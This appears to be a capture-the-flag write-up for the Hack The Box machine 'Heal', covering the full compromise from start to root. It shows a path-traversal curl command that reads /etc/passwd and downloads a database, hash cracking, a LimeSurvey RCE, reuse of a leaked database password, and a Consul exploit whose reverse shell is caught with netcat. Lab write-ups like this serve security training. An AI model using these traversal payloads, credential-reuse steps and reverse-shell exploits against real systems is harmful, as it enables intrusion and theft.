# Heal

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>



## Port scan

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 21:45 IST
Nmap scan report for 10.129.7.162 (10.129.7.162)
Host is up (0.41s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.93 seconds
```

## Subdomain scan

```bash
ffuf -u http://heal.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.heal.htb' -fs 178

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://heal.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.heal.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

api                     [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 411ms]
:: Progress: [4989/4989] :: Job [1/1] :: 102 req/sec :: Duration: [0:00:53] :: Errors: 0 ::
```

### /etc/hosts

Add `heal.htb`and `api.heal.htb`in /etc/hosts file



## Web attack - (API: LFI)

After signing up on the platform, we are redirected to /resume,\
here we can add our data and click on export

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

You can open `Dev tools`and see the api call made in the backend.\
**It's vulnerable to LFI**.

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

```bash
curl 'http://api.heal.htb/download?filename=../../../../../../../../../etc/passwd' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \                                                      
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' \
  -H 'Connection: keep-alive' \
  -H 'Origin: http://heal.htb' \
  -H 'Referer: http://heal.htb/' \                                                                         
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36' \
  --insecure

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin

<SNIP>
```

You can copy the command as cURL command from dev tools network tab.

I've played around this a bit, but nothing important files comes with this right now, \
I moved to another vector.

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

If we clicked on survey, it's takes us on another sub-domain. `take-survey.heal.htb`

If we looked into web source of this subdomain, we can clearly see it's using limesurvey for feedback collections.

```html
<meta name="generator" content="LimeSurvey http://www.limesurvey.org"/>
```

Upon googl'ing we can find a RCE vulnerability, (version? yes, i've edited writuep a bit, i'll explain later how I found the version)

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

It requires username and password to work, let's move further.

If we looked into `api.heal.htb` it index file tells it's a ruby application.\
`Rails version: 7.1.4`\


I am new to ruby rails, so google'd the structure of ruby on rails and config file path and found this beatiful blog.

{% embed url="https://dev.to/vvo/secrets-environment-variables-config-files-the-ruby-on-rails-case-433f" %}

Going through all files, I found `config/database.yml` to be more intresting,&#x20;

```ruby
$> ../../config/database.yml
# SQLite. Versions 3.8.0 and up are supported.
#   gem install sqlite3
#
#   Ensure the SQLite 3 gem is defined in your Gemfile
#   gem "sqlite3"
#
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

development:
  <<: *default
  database: storage/development.sqlite3

# Warning: The database defined as "test" will be erased and
# re-generated from your development database when you run "rake".
# Do not set this db to the same as development or production.
test:
  <<: *default
  database: storage/test.sqlite3

production:
  <<: *default
  database: storage/development.sqlite3
```

We have database files at `storage` directory.

```bash
heap@dragon:~/stuff/HTB/heal$ curl 'http://api.heal.htb/download?filename=../../storage/development.sqlite3' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' \
  -H 'Connection: keep-alive' \
  -H 'Origin: http://heal.htb' \
  -H 'Referer: http://heal.htb/' --insecure -s -o devlopment.sqlite3

heap@dragon:~/stuff/HTB/heal$ file devlopment.sqlite3
devlopment.sqlite3: SQLite 3.x database, last written using SQLite version 3045002, writer version 2, read version 2, file counter 2, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 2
```

Alright, we have 1 admin user to target, prolly that's gonna get us user shell.

### Hash crack

```sql
sqlite> select email, password_digest, username, is_admin from users;
ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|ralph|1
```

I'll use hashcat to bruteforce the plaintext for this hash.\
You can visit ([https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)) for exact hash id btw.

```
heap@dragon:~/stuff/HTB/heal$ hashcat --user -m 28400 -a 0 ralph.hash --show
ralph:$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:<redacted>
```

## www-data shell

We can login as admin (ralph) on `take-survey.heal.htb` , we can see the limesurvey version here on footer of the webpage.

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

The exploit we found earlier on google can be used here.\
Running that pops up a shell for us :)

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

First thing we should look is config files, that contains password. I came across these files,

```
www-data@heal:~/limesurvey$ find . | grep config.php
./vendor/tecnickcom/tcpdf/tcpdf_autoconfig.php
./vendor/tecnickcom/tcpdf/config/tcpdf_config.php
./vendor/kcfinder/conf/config.php
./vendor/yiisoft/yii/framework/messages/config.php
./vendor/yiisoft/yii/requirements/messages/config.php
./application/config/config.php
```

Reading the application/config/config.php, it reveals `db_user` password. Lets connect locally.

```
www-data@heal:~/limesurvey$ psql -U db_user -W -h localhost -d survey
psql -U db_user -W -h localhost -d survey
Password: AdmiDi0_pA$$w0rd

psql (14.15 (Ubuntu 14.15-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

survey=> 
```

And that worked!!

```sql
select uid, users_name, password from lime_users;
-- use \dt for table listing.
 
uid | users_name |                           password
-----+------------+--------------------------------------------------------------
   1 | ralph      | $2y$10$qMS2Rbu5NXKCPI5i6rjQPexhhJk33kv3KNt4uNjJ5XEvV9hv.om/C
```

I tried cracking this and it toooook a loonnnnnggg time. I moved on seeing how many users exsit on the system, found ron and ralph. \
Tried the database password with both the users and it worked for ron! (didn't liked this tbh, guessy as hell)

## Root shell

once we login as ron, \
we can see the current process with `ps -ef --forest` and notice that it's running `consul` (by hashicorp) on port 8500.

Quick googling can get us to following exploit :&#x20;

{% embed url="https://www.exploit-db.com/exploits/51117" %}

#### Exploit

```bash
python3 exploit_root.py 127.0.0.1 8500 127.0.0.1 9001 give_any_value
```

The acl token is a required argument (as per the script) but is not imp as we dont really use that to register. It's only used in Header.&#x20;

```
heap@dragon:~/stuff/HTB/heal$ rlwrap nc -nvlp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.46 50732
bash: cannot set terminal process group (22584): Inappropriate ioctl for device
bash: no job control in this shell
root@heal:/# id
uid=0(root) gid=0(root) groups=0(root)
root@heal:/#

```

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_heabytes' still pwning
